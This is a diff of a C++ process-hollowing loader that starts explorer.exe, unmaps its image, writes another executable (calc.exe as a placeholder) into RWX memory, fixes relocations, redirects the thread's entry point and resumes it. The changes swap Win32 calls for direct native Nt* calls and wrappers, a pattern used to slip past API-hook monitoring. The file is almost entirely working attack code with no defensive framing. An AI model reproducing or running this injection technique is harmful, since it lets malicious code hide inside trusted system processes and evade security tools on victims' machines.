@@ -1,22 +1,7 @@
 #include <iostream>
-#include <Windows.h>
-#include <winternl.h>
-
-typedef NTSTATUS(WINAPI* NtUnmapViewOfSection)(HANDLE, PVOID);
-typedef NTSTATUS(WINAPI* tNtQueryInformationProcess)(
-	HANDLE ProcessHandle,
-	PROCESSINFOCLASS ProcessInformationClass,
-	PVOID ProcessInformation,
-	ULONG ProcessInformationLength,
-	PULONG ReturnLength
-);
-typedef LPVOID(WINAPI* VirtualAllocExProc)(
-	HANDLE hProcess,
-	LPVOID lpAddress,
-	SIZE_T dwSize,
-	DWORD  flAllocationType,
-	DWORD  flProtect
-);
+#include <windows.h>
+#include "ntapi.h"
+#include "main.h"
 
 typedef struct BASE_RELOCATION_BLOCK {
 	DWORD PageAddress;
@@ -28,46 +13,46 @@ typedef struct BASE_RELOCATION_ENTRY {
 	USHORT Type : 4;
 } BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
 
-HMODULE ntdll = GetModuleHandleA("ntdll");
-HMODULE kernel32 = GetModuleHandleA("kernel32");
-
-int RunPE(LPVOID lpBuffer)
+int RunPE32(LPVOID lpBuffer)
 {
-	// create destination process
-	LPSTARTUPINFOA si = new STARTUPINFOA();
-	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
-	DWORD returnLength = 0;
-	if (!CreateProcessA(NULL, (LPSTR)"c:\\windows\\system32\\explorer.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi)) { 
-		printf("Failed to create process\n");
+	// create destination process and suspend primary thread
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (!CreateProcessA(NULL, (LPSTR)"\"c:\\windows\\syswow64\\explorer.exe\"", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) { 
+		printf("[-] Failed to create process: %i\n", GetLastError());
 		return -1;
 	};
-	HANDLE destProcess = pi->hProcess;
+	HANDLE destProcess = pi.hProcess;
+	NtSuspendProcess(destProcess);
+
+	// get context of the dest process thread
+	LPCONTEXT context = new CONTEXT();
+	context->ContextFlags = CONTEXT_INTEGER;
+	GetThreadContext_(pi.hThread, context);
 
 	// get destination imageBase offset address from the PEB
-	tNtQueryInformationProcess NtQueryInformationProcess_ = (tNtQueryInformationProcess)(GetProcAddress(ntdll, "NtQueryInformationProcess"));
-	NtQueryInformationProcess_(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
+	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
+	DWORD returnLength = 0;
+	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
 	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;
 
 	// get destination imageBaseAddress
 	LPVOID destImageBase = 0;
-	SIZE_T bytesRead = NULL;
-	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);
+	NtReadVirtualMemory(destProcess, (PVOID)(context->Ebx + 8), &destImageBase, sizeof(PVOID), NULL);
 
-	// read source file - this is the file that will be executed inside the hollowed process
-	LPDWORD fileBytesRead = 0;
+	// carve out the destination image
+	NtUnmapViewOfSection(destProcess, destImageBase);
 
 	// get source image size
 	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)lpBuffer;
-	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpBuffer + sourceImageDosHeaders->e_lfanew);
+	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)lpBuffer + sourceImageDosHeaders->e_lfanew);
 	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
 
-	// carve out the destination image
-	NtUnmapViewOfSection NtUnmapViewOfSection_ = (NtUnmapViewOfSection)(GetProcAddress(ntdll, "NtUnmapViewOfSection"));
-	NtUnmapViewOfSection_(destProcess, destImageBase);
-
 	// allocate new memory in destination image for the source image
-	VirtualAllocExProc VirtualAllocEx_ = (VirtualAllocExProc)(GetProcAddress(kernel32, "VirtualAllocEx"));
 	LPVOID newDestImageBase = VirtualAllocEx_(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	destImageBase = newDestImageBase;
 
@@ -76,19 +61,18 @@ int RunPE(LPVOID lpBuffer)
 
 	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
 	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
-	WriteProcessMemory(destProcess, newDestImageBase, lpBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
+	NtWriteVirtualMemory(destProcess, newDestImageBase, lpBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
 	// get pointer to first source image section
-	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)lpBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
+	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((UINT_PTR)lpBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
 	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
-	int err = GetLastError();
 
 	// copy source image sections to destination
 	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
 	{
-		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
-		PVOID sourceSectionLocation = (PVOID)((DWORD)lpBuffer + sourceImageSection->PointerToRawData);
-		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
+		PVOID destinationSectionLocation = (PVOID)((UINT_PTR)destImageBase + sourceImageSection->VirtualAddress);
+		PVOID sourceSectionLocation = (PVOID)((UINT_PTR)lpBuffer + sourceImageSection->PointerToRawData);
+		NtWriteVirtualMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
 		sourceImageSection++;
 	}
 
@@ -99,21 +83,19 @@ int RunPE(LPVOID lpBuffer)
 	sourceImageSection = sourceImageSectionOld;
 	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
 	{
-		BYTE* relocSectionName = (BYTE*)".reloc";
-		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
+		if (memcmp(sourceImageSection->Name, ".reloc", 7) != 0)
 		{
 			sourceImageSection++;
 			continue;
 		}
-
 		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
 		DWORD relocationOffset = 0;
 
 		while (relocationOffset < relocationTable.Size) {
-			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)lpBuffer + sourceRelocationTableRaw + relocationOffset);
+			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((UINT_PTR)lpBuffer + sourceRelocationTableRaw + relocationOffset);
 			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
 			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
-			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)lpBuffer + sourceRelocationTableRaw + relocationOffset);
+			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((UINT_PTR)lpBuffer + sourceRelocationTableRaw + relocationOffset);
 
 			for (DWORD y = 0; y < relocationEntryCount; y++)
 			{
@@ -126,48 +108,67 @@ int RunPE(LPVOID lpBuffer)
 
 				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
 				DWORD patchedBuffer = 0;
-				ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
+				NtReadVirtualMemory(destProcess, (PVOID)((UINT_PTR)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), NULL);
 				patchedBuffer += deltaImageBase;
 
-				WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
-				int a = GetLastError();
+				NtWriteVirtualMemory(destProcess, (PVOID)((UINT_PTR)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), NULL);
 			}
 		}
 	}
 
-	// get context of the dest process thread
-	LPCONTEXT context = new CONTEXT();
-	context->ContextFlags = CONTEXT_INTEGER;
-	GetThreadContext(pi->hThread, context);
-
-	// update dest image entry point to the new entry point of the source image and resume dest image thread
+	// update destination image entry point to the new entry point of the source image and resume destination image thread
 	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
 	context->Eax = patchedEntryPoint;
-	SetThreadContext(pi->hThread, context);
-	ResumeThread(pi->hThread);
+	SetThreadContext_(pi.hThread, context);
+	ResumeThread_(pi.hThread);
 
 	return 0;
 }
 
 int main(void) {
+	printf("%s %s\n", __DATE__, __TIME__);
 	HANDLE hFile = NULL;
 	LPVOID lpBuffer = NULL;
 	DWORD dwFileSize = 0;
 	DWORD dwBytesRead = 0;
-
-	hFile = CreateFile(L"C:\\windows\\system32\\calc.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	
+	// Open file for injecting 
+	hFile = CreateFile(L"C:\\windows\\syswow64\\calc.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile != NULL) {
 		dwFileSize = GetFileSize(hFile, NULL);
 		lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
 		if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL)) {
-			RunPE(lpBuffer);
+			UINT_PTR uiBaseAddress = (UINT_PTR)lpBuffer;
+
+			// get the File Offset of the modules NT Header
+			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
+
+			// currenlty we can only process a PE file which is the same type as the one this fuction has  
+			// been compiled as
+			if (pNtHeaders->OptionalHeader.Magic == 0x010B) // PE32
+			{
+				printf("[+] x86 PE Found\n");
+				RunPE32(lpBuffer);
+			}
+			else if (pNtHeaders->OptionalHeader.Magic == 0x020B) // PE64
+			{
+				printf("[+] x64 PE Found\n");
+				printf("[-] Can't process x64 PEs yet (Trust me, I tried :/)");
+				return 0;
+			}
+			else
+			{
+				printf("[-] ERROR: Could not read magic\n");
+				return 0;
+			}
+			
 		}
 		else {
-			printf("ReadFile error: %i\n", GetLastError());
+			printf("[-] ReadFile error: %i\n", GetLastError());
 		};
 	}
 	else {
-		printf("CreateFile error: %i\n", GetLastError());
+		printf("[-] CreateFile error: %i\n", GetLastError());
 	}
 
 }
